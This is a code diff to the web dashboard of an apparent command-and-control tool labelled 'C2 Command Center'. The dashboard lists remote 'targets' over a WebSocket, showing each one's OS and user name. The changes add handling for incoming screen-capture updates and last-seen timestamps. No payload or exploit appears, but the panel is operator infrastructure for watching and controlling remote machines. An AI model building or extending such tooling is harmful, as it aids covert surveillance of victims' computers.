@@ -11,7 +11,7 @@
         .card:hover { transform: translateY(-2px); border-color: #3b82f6; }
         .btn { background: #3b82f6; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; border-radius: 4px; }
         .btn:hover { background: #2563eb; }
-        
+
         /* Logs Container */
         #logs-container { height: 300px; overflow-y: auto; background: #000; padding: 10px; font-size: 12px; color: #ccc; border: 1px solid #334155; border-radius: 8px; }
         .log-entry { margin-bottom: 4px; border-bottom: 1px solid #1e293b; padding-bottom: 2px; }
@@ -26,20 +26,19 @@
 </head>
 <body>
     <h1>🛡️ C2 Command Center</h1>
-    
+
     <!-- User Grid -->
     <div class="grid" id="userGrid"></div>
-    
+
     <!-- Live Logs -->
     <h3>Live Event Log</h3>
     <div id="logs-container"></div>
 
     <script>
-        // DYNAMIC CONNECTION: Use current host's protocol and host
         const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const host = window.location.host; 
+        const host = window.location.host;
         const wsUrl = `${protocol}//${host}/`;
-        
+
         const ws = new WebSocket(wsUrl);
         let users = {};
 
@@ -68,28 +67,40 @@
 
                     // Add to grid
                     if (!users[data.targetId]) {
-                        users[data.targetId] = { status: 'Online', logs: [], info: data };
+                        users[data.targetId] = { status: 'Online', logs: [], info: data, lastSeen: Date.now() };
                     } else {
                         // Update existing user info
                         users[data.targetId].status = 'Online';
                         users[data.targetId].info = data;
+                        users[data.targetId].lastSeen = Date.now();
                     }
                     renderUsers();
                 }
                 else if (data.type === 'system') {
                     addLog(data.message, 'blue');
                 }
+                else if (data.type === 'screen_data') {
+                    // Log screen updates
+                    addLog(`📺 Screen update from ${data.targetId}`, 'blue');
+                    
+                    // Ensure user exists in grid even if they didn't send 'info' first
+                    if (!users[data.targetId]) {
+                        users[data.targetId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
+                    }
+                    users[data.targetId].lastSeen = Date.now();
+                    renderUsers();
+                }
                 else {
-                    // Generic fallback for other types (offer, answer, candidate, screen_data, etc.)
-                    // Only log if it's not already handled above
-                    if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'info') {
+                    // Generic fallback for other types (offer, answer, candidate)
+                    if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'info' && data.type !== 'screen_data') {
                         addLog(`[${data.targetId}] Received: ${data.type}`, 'blue');
-                        
-                        // Ensure user exists in grid even if they didn't send 'info' first
+
+                        // Ensure user exists in grid
                         if (!users[data.targetId]) {
-                            users[data.targetId] = { status: 'Online', logs: [] };
+                            users[data.targetId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
                         }
                         users[data.targetId].logs.push(data.type);
+                        users[data.targetId].lastSeen = Date.now();
                         renderUsers();
                     }
                 }
@@ -102,19 +113,19 @@
             const logContainer = document.getElementById('logs-container');
             const div = document.createElement('div');
             div.className = `log-entry log-alert-${colorClass}`;
-            
+
             const timeSpan = document.createElement('span');
             timeSpan.className = 'log-time';
             timeSpan.innerText = new Date().toLocaleTimeString();
-            
+
             const msgSpan = document.createElement('span');
             msgSpan.innerText = msg;
-            
+
             div.appendChild(timeSpan);
             div.appendChild(msgSpan);
-            
+
             logContainer.prepend(div);
-            
+
             // Keep log size manageable
             if (logContainer.children.length > 100) {
                 logContainer.removeChild(logContainer.lastChild);
@@ -124,14 +135,14 @@
         function renderUsers() {
             const grid = document.getElementById('userGrid');
             grid.innerHTML = '';
-            
+
             for (const [id, data] of Object.entries(users)) {
                 const card = document.createElement('div');
                 card.className = 'card';
-                
+
                 const osInfo = data.info ? `${data.info.os} / ${data.info.user}` : 'Unknown OS';
-                const lastSeen = data.info ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
-                
+                const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
+
                 card.innerHTML = `
                     <strong>User ID: ${id}</strong><br>
                     <span class="status-dot"></span> Info: ${osInfo}<br>
